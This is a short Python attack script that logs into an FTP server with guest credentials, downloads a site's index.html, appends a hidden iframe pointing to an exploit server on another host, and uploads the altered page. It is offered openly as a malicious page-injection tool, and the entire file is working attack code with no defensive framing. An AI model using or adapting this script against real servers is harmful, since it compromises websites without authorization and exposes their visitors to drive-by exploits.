import ftplib


def inject_page(ftp, page, redirect):
    with open(page + '.tmp', 'w') as file:
        ftp.retrlines('RETR ' + page, file.write)
        print(f'[+] Downloaded Page: {page}')
        file.write(redirect)

    print(f'[+] Injected Malicious IFrame on: {page}')

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print(f'[+] Uploaded Injected Page: {page}')


if __name__ == "__main__":
    tgt_host = '192.168.95.179'
    username = 'guest'
    password = 'guest'

    conn = ftplib.FTP(tgt_host)
    conn.login(username, password)

    redirect_html = '<iframe src="http:\\\\10.10.10.112:8080\\exploit">' \
                    '</iframe>'
    inject_page(conn, 'index.html', redirect_html)
